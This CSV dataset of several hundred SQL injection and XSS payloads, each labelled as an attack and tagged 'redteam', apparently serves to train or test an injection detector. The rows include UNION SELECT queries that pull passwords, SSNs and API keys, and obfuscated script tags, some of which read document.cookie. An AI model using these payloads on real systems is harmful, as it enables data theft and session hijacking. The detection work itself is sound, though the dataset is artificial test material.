text,label,attack_type,category,generator
"<img
src=x
onerror=top['al'+'ert'](1)>",1,xss,redteam,claude
' oR password is not NULL/*c*/,1,sqli,redteam,claude
fetch all clients where 4 is 6 or true,1,sqli,redteam,claude
char(49) Or char(52)=char(51),1,sqli,redteam,claude
"7%20uNion SeLecT secret,hash,email FrOm sessions;",1,sqli,redteam,claude
5 oR hash lIKE '%',1,sqli,redteam,claude
<svg onpointerrawupdate=top['al'+'ert']`1`>,1,xss,redteam,claude
5 oR 4=4-- x,1,sqli,redteam,claude
<iframe onfocus=self['al'+'ert']`1`>,1,xss,redteam,claude
7 AND (select count(*) from members)>3-- ,1,sqli,redteam,claude
1 Or exists(select secret from users);,1,sqli,redteam,claude
1 oR exists(select hash from auth),1,sqli,redteam,claude
6 aNd (select count(*) from sessions)>2#,1,sqli,redteam,claude
1 OR exists(select secret from orders)#,1,sqli,redteam,claude
<img/src=x	onerror=top['al'+'ert'](1)>,1,xss,redteam,claude
<IMG OnErROr=alert`1`>,1,xss,redteam,claude
<audio onerror=&#106;lert(1)>,1,xss,redteam,claude
char(51) Or char(56)=char(56),1,sqli,redteam,claude
6 Or 6=6#,1,sqli,redteam,claude
<imgsrc=x/onerror=print()>,1,xss,redteam,claude
1' Or 'z'='y-- ,1,sqli,redteam,claude
please render <video onload=alert(document.domain)> here,1,xss,redteam,claude
<iFrAmE oNErROr=alert(1)>,1,xss,redteam,claude
9 Or token liKe '%',1,sqli,redteam,claude
please render <video onload=alert`1`> here,1,xss,redteam,claude
<videoonfocus=alert(document.cookie)>,1,xss,redteam,claude
fetch all people where 2 is 1 or true,1,sqli,redteam,claude
5 Or 5=6-- ,1,sqli,redteam,claude
"5	uNiOn%20SELeCt password,email,token FroM people-- x",1,sqli,redteam,claude
"6%20unioN/**/sEleCT ssn,uid,secret frOM auth-- ",1,sqli,redteam,claude
char(48) or char(51)=char(54),1,sqli,redteam,claude
4 OR password likE '%'-- -,1,sqli,redteam,claude
Or exists(select token from staff)-- ,1,sqli,redteam,claude
<SvG ONeRRoR=print()>,1,xss,redteam,claude
please render <video onload=confirm(1)> here,1,xss,redteam,claude
please render <svg ontoggle=alert(1)> here,1,xss,redteam,claude
char(52) or char(57)=char(54),1,sqli,redteam,claude
"1	UNIOn/**/SElECt password,apikey frOM sessions#",1,sqli,redteam,claude
9 And (select count(*) from auth)>3-- ,1,sqli,redteam,claude
<body ontoggle=&#115;lert(1)>,1,xss,redteam,claude
show me every tokens where 1 equals 6 or true,1,sqli,redteam,claude
8 aNd (select count(*) from people)>0/*c*/,1,sqli,redteam,claude
char(56) oR char(55)=char(53),1,sqli,redteam,claude
please render <video ontoggle=alert(1)> here,1,xss,redteam,claude
4 oR secret lIKE '%';,1,sqli,redteam,claude
user' OR 'b'='y%00,1,sqli,redteam,claude
"5	Union%20sELect password,ssn,email From members-- -",1,sqli,redteam,claude
3 OR 9=6%00,1,sqli,redteam,claude
1 OR exists(select email from clients);,1,sqli,redteam,claude
<objectonfocus=alert`1`>,1,xss,redteam,claude
' oR token iS nOT nUll,1,sqli,redteam,claude
"<img
src=x/onerror=confirm(1)>",1,xss,redteam,claude
"7%20UniOn/**/SElEct pwd,password,role FROM users;",1,sqli,redteam,claude
0 Or 9=1-- x,1,sqli,redteam,claude
char(55) OR char(53)=char(54),1,sqli,redteam,claude
"<video
onpageshow=confirm(1)>",1,xss,redteam,claude
1 OR exists(select email from users)-- ,1,sqli,redteam,claude
<IMG OnERRor=top['al'+'ert'](1)>,1,xss,redteam,claude
5 or ssn LIKe '%'/*c*/,1,sqli,redteam,claude
<SvG Onerror=top['al'+'ert'](1)>,1,xss,redteam,claude
3 aND (select count(*) from clients)>2-- x,1,sqli,redteam,claude
please render <details onstart=alert(document.cookie)> here,1,xss,redteam,claude
<svg/onfocus=alert(1)>,1,xss,redteam,claude
<form onload=window['al'+'ert']`1`>,1,xss,redteam,claude
OR exists(select hash from people);,1,sqli,redteam,claude
4 Or 7=9,1,sqli,redteam,claude
7 anD (select count(*) from auth)>1,1,sqli,redteam,claude
8 OR 7=9;,1,sqli,redteam,claude
7 Or 8=1-- ,1,sqli,redteam,claude
8 or ssn LIKe '%',1,sqli,redteam,claude
<body onload=window['al'+'ert']`1`>,1,xss,redteam,claude
<svg/onload=alert(1)>,1,xss,redteam,claude
oR exists(select apikey from sessions)-- -,1,sqli,redteam,claude
<video onfocus=&#106;lert(1)>,1,xss,redteam,claude
1 or exists(select pwd from clients),1,sqli,redteam,claude
<body ontoggle=&#117;lert(1)>,1,xss,redteam,claude
6 OR 1=8;,1,sqli,redteam,claude
' oR apikey IS Not nULL#,1,sqli,redteam,claude
9 oR 9=1-- -,1,sqli,redteam,claude
7 oR pwd LIkE '%'-- x,1,sqli,redteam,claude
give all clients where 9 is 3 or true,1,sqli,redteam,claude
"3%20UniON%20SELEcT email,token,apikey FrOM members#",1,sqli,redteam,claude
1 or exists(select token from orders),1,sqli,redteam,claude
<math onanimationstart=&#101;lert(1)>,1,xss,redteam,claude
char(50) Or char(49)=char(51),1,sqli,redteam,claude
x' or 'z'='z-- -,1,sqli,redteam,claude
please render <form onerror=alert(document.domain)> here,1,xss,redteam,claude
9 or role LIke '%'-- x,1,sqli,redteam,claude
"""><svg onstart=confirm(1)>",1,xss,redteam,claude
8 oR 8=3-- ,1,sqli,redteam,claude
please render <details onpageshow=alert(document.cookie)> here,1,xss,redteam,claude
"8/**/UnIon sElEcT ssn,secret FROM users/*c*/",1,sqli,redteam,claude
<IMG oNErroR=top['al'+'ert'](1)>,1,xss,redteam,claude
9 OR 9=1-- -,1,sqli,redteam,claude
1 oR 5=2-- ,1,sqli,redteam,claude
<iFrAmE oNerROr=top['al'+'ert'](1)>,1,xss,redteam,claude
9 or 3=8/*c*/,1,sqli,redteam,claude
<img%20src=x%20onerror=alert(document.cookie)>,1,xss,redteam,claude
1 or exists(select token from members);,1,sqli,redteam,claude
9 and (select count(*) from staff)>0-- x,1,sqli,redteam,claude
"""><math onerror=top['al'+'ert'](1)>",1,xss,redteam,claude
7 aND (select count(*) from orders)>1#,1,sqli,redteam,claude
list every staff where 5 = 5 or true,1,sqli,redteam,claude
please render <marquee onerror=alert(1)> here,1,xss,redteam,claude
' OR uid iS noT NuLl;,1,sqli,redteam,claude
<IMG oneRROR=top['al'+'ert'](1)>,1,xss,redteam,claude
give all tokens where 2 = 7 or true,1,sqli,redteam,claude
6 oR password lIkE '%',1,sqli,redteam,claude
7 ANd (select count(*) from staff)>3#,1,sqli,redteam,claude
<iframe onafterscriptexecute=self['al'+'ert']`1`>,1,xss,redteam,claude
or exists(select uid from users)-- -,1,sqli,redteam,claude
"""><xss onanimationstart=alert`1`>",1,xss,redteam,claude
x' or 'y'='z%00,1,sqli,redteam,claude
char(57) oR char(57)=char(50),1,sqli,redteam,claude
"3	UniOn sElECt ssn,token,password FrOm staff-- -",1,sqli,redteam,claude
please render <embed onafterscriptexecute=confirm(1)> here,1,xss,redteam,claude
please render <audio onstart=confirm(1)> here,1,xss,redteam,claude
' oR ssn is nOT null-- -,1,sqli,redteam,claude
<iFrAmE ONErRoR=top['al'+'ert'](1)>,1,xss,redteam,claude
char(54) or char(54)=char(52),1,sqli,redteam,claude
0 or 8=9-- ,1,sqli,redteam,claude
"""><audio ontoggle=top['al'+'ert'](1)>",1,xss,redteam,claude
x' Or 'a'='a-- -,1,sqli,redteam,claude
"""><embed onpointerrawupdate=confirm(1)>",1,xss,redteam,claude
4 AnD (select count(*) from staff)>3-- ,1,sqli,redteam,claude
' or uid Is NOt nuLL/*c*/,1,sqli,redteam,claude
8 aNd (select count(*) from members)>2-- -,1,sqli,redteam,claude
8 And (select count(*) from orders)>0/*c*/,1,sqli,redteam,claude
6 and (select count(*) from accounts)>2-- -,1,sqli,redteam,claude
list every clients where 9 equals 3 or true,1,sqli,redteam,claude
return all sessions where 6 = 3 or true,1,sqli,redteam,claude
"""><audio onerror=print()>",1,xss,redteam,claude
3 Or pwd lIKe '%'#,1,sqli,redteam,claude
<SvG onErrOR=alert`1`>,1,xss,redteam,claude
please render <isindex ontoggle=alert(document.domain)> here,1,xss,redteam,claude
' or token IS nOT NULl,1,sqli,redteam,claude
<img	src=xonerror=print()>,1,xss,redteam,claude
<iframeonerror=alert(document.cookie)>,1,xss,redteam,claude
char(48) Or char(49)=char(49),1,sqli,redteam,claude
2 or password lIKe '%';,1,sqli,redteam,claude
char(49) oR char(56)=char(54),1,sqli,redteam,claude
3 AND (select count(*) from people)>0;,1,sqli,redteam,claude
<math onpointerrawupdate=&#122;lert(1)>,1,xss,redteam,claude
6%20uNIOn/**/seLEct secret fRoM orders/*c*/,1,sqli,redteam,claude
"1 uNiON/**/seLeCt role,ssn,uid frOM staff-- -",1,sqli,redteam,claude
Or exists(select password from accounts)%00,1,sqli,redteam,claude
8 anD (select count(*) from people)>3#,1,sqli,redteam,claude
please render <isindex onpageshow=top['al'+'ert'](1)> here,1,xss,redteam,claude
please render <embed onerror=print()> here,1,xss,redteam,claude
char(51) oR char(54)=char(51),1,sqli,redteam,claude
"<img%20src=x
onerror=alert`1`>",1,xss,redteam,claude
fetch all people where 5 is 5 or true,1,sqli,redteam,claude
"""><math onload=print()>",1,xss,redteam,claude
"2	UnioN SELEcT uid,apikey FROM people;",1,sqli,redteam,claude
1 OR exists(select apikey from staff)#,1,sqli,redteam,claude
"<img
src=xonerror=print()>",1,xss,redteam,claude
"<iframe
onanimationstart=alert(document.domain)>",1,xss,redteam,claude
<svg/ontoggle=print()>,1,xss,redteam,claude
<SvG OnERroR=top['al'+'ert'](1)>,1,xss,redteam,claude
<IMG ONerROR=alert(document.domain)>,1,xss,redteam,claude
x' oR 'b'='b;,1,sqli,redteam,claude
8 or hash lIKe '%'-- ,1,sqli,redteam,claude
"""><audio onfocus=alert(document.cookie)>",1,xss,redteam,claude
user' or 'z'='z-- x,1,sqli,redteam,claude
6 or 4=7/*c*/,1,sqli,redteam,claude
<img/src=x	onerror=alert(document.cookie)>,1,xss,redteam,claude
x' or 'b'='y;,1,sqli,redteam,claude
7 oR 3=4-- ,1,sqli,redteam,claude
list every orders where 7 = 6 or true,1,sqli,redteam,claude
<isindexonfocus=alert(document.domain)>,1,xss,redteam,claude
' Or apikey IS NOT Null,1,sqli,redteam,claude
list all staff where 4 = 8 or true,1,sqli,redteam,claude
1 Or exists(select hash from auth)-- ,1,sqli,redteam,claude
show me all members where 7 equals 1 or true,1,sqli,redteam,claude
' OR uid is nOT NULL,1,sqli,redteam,claude
char(51) Or char(55)=char(51),1,sqli,redteam,claude
"""><math onerror=confirm(1)>",1,xss,redteam,claude
1 anD (select count(*) from staff)>1;,1,sqli,redteam,claude
<embed onstart=&#100;lert(1)>,1,xss,redteam,claude
<embed ontoggle=&#110;lert(1)>,1,xss,redteam,claude
4 AnD (select count(*) from staff)>1-- x,1,sqli,redteam,claude
<iFrAmE oneRROr=alert`1`>,1,xss,redteam,claude
0 oR 6=1%00,1,sqli,redteam,claude
8	UNiON sELeCt hash fROM members-- -,1,sqli,redteam,claude
2 Or 4=9,1,sqli,redteam,claude
"6%20unIOn%20seLECT hash,uid,pwd FroM tokens-- ",1,sqli,redteam,claude
<style onload=&#103;lert(1)>,1,xss,redteam,claude
6 Or role Like '%'/*c*/,1,sqli,redteam,claude
<img%20src=x/onerror=confirm(1)>,1,xss,redteam,claude
give every auth where 8 = 8 or true,1,sqli,redteam,claude
9 oR 3=7-- x,1,sqli,redteam,claude
<details ontoggle=&#110;lert(1)>,1,xss,redteam,claude
admin' or 'b'='a/*c*/,1,sqli,redteam,claude
1' oR 'b'='b;,1,sqli,redteam,claude
<style onerror=top['al'+'ert']`1`>,1,xss,redteam,claude
' or role Is not NulL,1,sqli,redteam,claude
<IMG onErROr=alert(document.cookie)>,1,xss,redteam,claude
1 OR hash lIkE '%';,1,sqli,redteam,claude
"7 unIoN/**/sELeCT hash,password frOm staff-- -",1,sqli,redteam,claude
1 or password LIke '%'-- x,1,sqli,redteam,claude
1 OR hash LikE '%'/*c*/,1,sqli,redteam,claude
1' oR 'b'='z-- x,1,sqli,redteam,claude
' OR uid Is noT nUlL-- -,1,sqli,redteam,claude
' or role is not nUll-- ,1,sqli,redteam,claude
<img/src=x%20onerror=alert`1`>,1,xss,redteam,claude
char(49) Or char(48)=char(50),1,sqli,redteam,claude
give every people where 8 equals 3 or true,1,sqli,redteam,claude
1 Or exists(select uid from staff),1,sqli,redteam,claude
please render <svg onpointerrawupdate=alert(document.domain)> here,1,xss,redteam,claude
7 oR 5=7;,1,sqli,redteam,claude
7 oR pwd LIke '%',1,sqli,redteam,claude
"""><svg onpointerrawupdate=alert(document.cookie)>",1,xss,redteam,claude
"<img%20src=x
onerror=confirm(1)>",1,xss,redteam,claude
' or token IS noT NuLl#,1,sqli,redteam,claude
<IMG ONeRrOr=alert`1`>,1,xss,redteam,claude
char(53) oR char(48)=char(52),1,sqli,redteam,claude
<isindex onpageshow=&#119;lert(1)>,1,xss,redteam,claude
please render <style onfocus=alert(document.domain)> here,1,xss,redteam,claude
' Or apikey iS NoT nUlL-- -,1,sqli,redteam,claude
<IMG ONErroR=alert(1)>,1,xss,redteam,claude
5/**/Union%20sElECt email frOm clients#,1,sqli,redteam,claude
<img	src=xonerror=top['al'+'ert'](1)>,1,xss,redteam,claude
<svg onload=top['al'+'ert']`1`>,1,xss,redteam,claude
please render <video onpointerrawupdate=alert(document.domain)> here,1,xss,redteam,claude
<video/onerror=alert`1`>,1,xss,redteam,claude
<IMG OneRROR=confirm(1)>,1,xss,redteam,claude
5 oR 5=1-- -,1,sqli,redteam,claude
"3	uniON%20SeLECt password,email frOM people-- x",1,sqli,redteam,claude
please render <math onstart=alert(document.cookie)> here,1,xss,redteam,claude
"""><details onpageshow=alert(document.domain)>",1,xss,redteam,claude
6 ANd (select count(*) from orders)>2;,1,sqli,redteam,claude
0' or 'x'='x-- -,1,sqli,redteam,claude
4%20uniON/**/selECt apikey fRoM people-- x,1,sqli,redteam,claude
' oR hash IS NOT Null;,1,sqli,redteam,claude
"9%20UNiOn SELECT uid,hash,apikey fROm people",1,sqli,redteam,claude
' oR hash is Not nULl-- ,1,sqli,redteam,claude
"5	uNion%20SElEcT pwd,token,hash fROm users",1,sqli,redteam,claude
please render <body onload=confirm(1)> here,1,xss,redteam,claude
char(56) Or char(48)=char(54),1,sqli,redteam,claude
<iframe onpointerrawupdate=alert(document.domain)>,1,xss,redteam,claude
' OR ssn iS not nulL-- x,1,sqli,redteam,claude
1 and (select count(*) from accounts)>2-- x,1,sqli,redteam,claude
"""><isindex onanimationstart=alert(1)>",1,xss,redteam,claude
user' Or 'x'='z-- ,1,sqli,redteam,claude
char(50) OR char(48)=char(57),1,sqli,redteam,claude
' oR apikey IS NOT NULl-- -,1,sqli,redteam,claude
"""><body onpointerrawupdate=alert`1`>",1,xss,redteam,claude
8 oR 9=2/*c*/,1,sqli,redteam,claude
9 aND (select count(*) from tokens)>3/*c*/,1,sqli,redteam,claude
1' Or 'y'='y;,1,sqli,redteam,claude
x' Or 'x'='b,1,sqli,redteam,claude
<form onstart=&#98;lert(1)>,1,xss,redteam,claude
5 Or pwd Like '%'#,1,sqli,redteam,claude
<svg/onanimationstart=alert(document.domain)>,1,xss,redteam,claude
<svg/onpageshow=alert(1)>,1,xss,redteam,claude
6 Or 6=1#,1,sqli,redteam,claude
' oR pwd IS not NulL/*c*/,1,sqli,redteam,claude
<imgsrc=x%20onerror=confirm(1)>,1,xss,redteam,claude
x' or 'y'='a,1,sqli,redteam,claude
1 oR exists(select pwd from sessions)%00,1,sqli,redteam,claude
